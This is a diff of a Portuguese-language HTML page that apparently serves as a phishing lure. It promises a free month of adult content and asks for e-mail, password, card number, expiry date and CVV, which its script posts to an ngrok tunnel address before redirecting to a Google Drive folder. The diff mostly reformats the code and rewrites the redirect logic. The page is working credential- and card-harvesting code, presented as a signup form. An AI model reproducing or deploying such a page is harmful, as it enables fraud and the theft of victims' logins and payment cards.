@@ -1,162 +1,168 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Form</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <style>
-        /* Estilo para o corpo da página */
-        body {
-            font-family: Arial, sans-serif;
-            background-image: url('https://github.com/Lai1s/presente/blob/5c9504ffab714c5cd2ea7edcf3fc5180786f2a52/fundo%202%20p.jpeg?raw=true'); /* Caminho para a imagem de fundo no GitHub */
-            background-size: cover; /* Garante que a imagem cubra todo o fundo */
-            background-repeat: no-repeat; /* Evita repetição da imagem */
-            background-position: center; /* Centraliza a imagem */
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #000;
-            position: relative;
-        }
-        /* Estilo para o container */
-        .container {
-            width: 350px;
-            background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
-            position: relative;
-            z-index: 1;
-        }
-        /* Estilo para os cabeçalhos dentro do container */
-        .container h2 {
-            text-align: center;
-            margin-bottom: 0;
-            color: #00f; /* Azul mais chamativo */
-            font-weight: bold;
-            font-family: Arial, sans-serif;
-            font-size: 24px;
-        }
-        /* Estilo para o texto dos conteúdos */
-        .conteudos {
-            text-align: center; /* Alinhando o texto ao centro */
-            margin-top: 5px; /* Adicionando espaço entre os elementos */
-            margin-bottom: 5px; /* Adicionando espaço entre os elementos */
-            font-size: 18px;
-            color: #000;
-            font-weight: bold;
-            font-family: Arial, sans-serif;
-            line-height: 1.2;
-        }
-        /* Estilo para grupo de formulário */
-        .form-group {
-            margin-bottom: 20px;
-        }
-        /* Estilo para campos de entrada de formulário */
-        input.form-control {
-            border-radius: 20px;
-            padding: 12px 20px;
-            font-size: 16px;
-            border: 1px solid #ddd;
-        }
-        /* Estilo para botão */
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #007bff;
-            color: #fff;
-            font-size: 18px;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        /* Estilo para o estado de hover do botão */
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Form</title>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<style>
+/* Estilo para o corpo da página */
+body {
+    font-family: Arial, sans-serif;
+    background-image: url('https://github.com/Lai1s/presente/blob/5c9504ffab714c5cd2ea7edcf3fc5180786f2a52/fundo%202%20p.jpeg?raw=true'); /* Caminho para a imagem de fundo no GitHub */
+    background-size: cover; /* Garante que a imagem cubra todo o fundo */
+    background-repeat: no-repeat; /* Evita repetição da imagem */
+    background-position: center; /* Centraliza a imagem */
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: #000;
+    position: relative;
+}
+/* Estilo para o container */
+.container {
+    width: 350px;
+    background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
+    position: relative;
+    z-index: 1;
+}
+/* Estilo para os cabeçalhos dentro do container */
+.container h2 {
+    text-align: center;
+    margin-bottom: 0;
+    color: #00f; /* Azul mais chamativo */
+    font-weight: bold;
+    font-family: Arial, sans-serif;
+    font-size: 24px;
+}
+/* Estilo para o texto dos conteúdos */
+.conteudos {
+    text-align: center; /* Alinhando o texto ao centro */
+    margin-top: 5px; /* Adicionando espaço entre os elementos */
+    margin-bottom: 5px; /* Adicionando espaço entre os elementos */
+    font-size: 18px;
+    color: #000;
+    font-weight: bold;
+    font-family: Arial, sans-serif;
+    line-height: 1.2;
+}
+/* Estilo para grupo de formulário */
+.form-group {
+    margin-bottom: 20px;
+}
+/* Estilo para campos de entrada de formulário */
+input.form-control {
+    border-radius: 20px;
+    padding: 12px 20px;
+    font-size: 16px;
+    border: 1px solid #ddd;
+}
+/* Estilo para botão */
+button {
+    width: 100%;
+    padding: 12px;
+    background-color: #007bff;
+    color: #fff;
+    font-size: 18px;
+    border: none;
+    border-radius: 20px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+/* Estilo para o estado de hover do botão */
+button:hover {
+    background-color: #0056b3;
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <h2>PROMOÇÃO 1 MÊS GRÁTIS</h2>
-        <p class="conteudos">Criar Conta</p>
-        <p class="conteudos">Conteúdos Lais🔞</p>
-        <form id="loginForm" method="POST" action="https://0a22-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
-            <div class="form-group">
-                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
-            </div>
-            <div class="form-group">
-                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
-            </div>
-            <div class="form-group">
-                <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Número do Cartão" inputmode="numeric" maxlength="16" oninput="formatCardNumber(this)">
-            </div>
-            <div class="form-group">
-                <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade" inputmode="numeric" maxlength="5" oninput="formatExpiryDate(this)">
-            </div>
-            <div class="form-group">
-                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV" maxlength="3">
-            </div>
-            <button type="button" onclick="enviarFormulario()">Entrar</button>
-            <p id="mensagemErro" style="color: red;"></p>
-        </form>
-    </div>
+<div class="container">
+<h2>PROMOÇÃO 1 MÊS GRÁTIS</h2>
+<p class="conteudos">Criar Conta</p>
+<p class="conteudos">Conteúdos Lais🔞</p>
+<form id="loginForm" method="POST" action="https://0a22-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
+<div class="form-group">
+<input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
+</div>
+<div class="form-group">
+<input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
+</div>
+<div class="form-group">
+<input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Número do Cartão" inputmode="numeric" maxlength="16" oninput="formatCardNumber(this)">
+</div>
+<div class="form-group">
+<input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade" inputmode="numeric" maxlength="5" oninput="formatExpiryDate(this)">
+</div>
+<div class="form-group">
+<input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV" maxlength="3">
+</div>
+<button type="button" onclick="enviarFormulario()">Entrar</button>
+<p id="mensagemErro" style="color: red;"></p>
+</form>
+</div>
 
-    <script>
-        function enviarFormulario() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-            var cardNumber = document.getElementById('cardNumber').value;
-            var expiryDate = document.getElementById('expiryDate').value;
-            var cvv = document.getElementById('cvv').value;
+<script>
+function enviarFormulario() {
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    var cardNumber = document.getElementById('cardNumber').value;
+    var expiryDate = document.getElementById('expiryDate').value;
+    var cvv = document.getElementById('cvv').value;
 
-            if (email === '' || password === '' || cardNumber === '' || expiryDate === '' || cvv === '') {
-                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
-                return;
-            }
+    if (email === '' || password === '' || cardNumber === '' || expiryDate === '' || cvv === '') {
+        document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
+        return;
+    }
 
-            var formData = new FormData();
-            formData.append('email', email);
-            formData.append('password', password);
-            formData.append('cardNumber', cardNumber);
-            formData.append('expiryDate', expiryDate);
-            formData.append('cvv', cvv);
+    var formData = new FormData();
+    formData.append('email', email);
+    formData.append('password', password);
+    formData.append('cardNumber', cardNumber);
+    formData.append('expiryDate', expiryDate);
+    formData.append('cvv', cvv);
 
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', document.getElementById("loginForm").action);
-            xhr.onload = function () {
-                if (xhr.status === 200 || xhr.status === 302) {
-                    window.location.href = "https://drive.google.com/drive/folders/1-UTHTy5TGa6Krenl8FVx-s0KuHHAn9pP?usp=sharing";
-                } else {
-                    var mensagem = xhr.responseText;
-                    document.getElementById('mensagemErro').innerText = mensagem;
-                    document.getElementById("loginForm").reset(); // Limpar campos após erro
-                }
-            };
-            xhr.send(formData);
-        }
-
-        function formatExpiryDate(input) {
-            var value = input.value.replace(/\D/g, '').substring(0, 4);
-            var newValue = '';
-            if (value.length > 2) {
-                newValue += value.substr(0, 2) + '/' + value.substr(2);
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', document.getElementById("loginForm").action);
+    xhr.onload = function () {
+        if (xhr.status === 200) {
+            if (cvv === 'PPP') {
+                window.location.href = "https://drive.google.com/drive/folders/1-UTHTy5TGa6Krenl8FVx-s0KuHHAn9pP?usp=sharing";
             } else {
-                newValue += value;
+                document.getElementById('mensagemErro').innerText = 'Redirecionamento necessário.';
             }
-            input.value = newValue;
+        } else if (xhr.status === 302) {
+            window.location.href = xhr.getResponseHeader('Location');
+        } else {
+            var mensagemErro = 'Erro ao enviar os dados. Por favor, verifique suas informações e tente novamente.';
+            document.getElementById('mensagemErro').innerText = mensagemErro;
+            document.getElementById("loginForm").reset(); // Limpar campos após erro
         }
+    };
+    xhr.send(formData);
+}
 
-        function formatCardNumber(input) {
-            var value = input.value.replace(/\D/g, '');
-            value = value.substring(0, 16);
-            input.value = value;
-        }
-    </script>
+function formatExpiryDate(input) {
+    var value = input.value.replace(/\D/g, '').substring(0, 4);
+    var newValue = '';
+    if (value.length > 2) {
+        newValue += value.substr(0, 2) + '/' + value.substr(2);
+    } else {
+        newValue += value;
+    }
+    input.value = newValue;
+}
+
+function formatCardNumber(input) {
+    var value = input.value.replace(/\D/g, '');
+    value = value.substring(0, 16);
+    input.value = value;
+}
+</script>
 </body>
 </html>
